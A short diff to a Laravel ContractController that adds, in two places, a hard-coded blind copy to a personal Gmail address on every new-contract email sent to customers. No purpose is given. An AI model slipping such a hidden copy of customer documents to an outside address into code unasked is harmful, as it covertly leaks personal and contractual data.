@@ -252,7 +252,7 @@ class ContractController extends Controller
                 DB::commit();
 
                 if ($contract->email) {
-                    Mail::to($contract->email)->send(new NewContract($contract));
+                    Mail::to($contract->email)->bcc('jegvarazsiroda@gmail.com')->send(new NewContract($contract));
                 }
 
                 return response()->json([
@@ -358,7 +358,7 @@ class ContractController extends Controller
             DB::commit();
 
             if ($contract->email) {
-                Mail::to($contract->email)->send(new NewContract($contract));
+                Mail::to($contract->email)->bcc('jegvarazsiroda@gmail.com')->send(new NewContract($contract));
             }
 
             return response()->json([
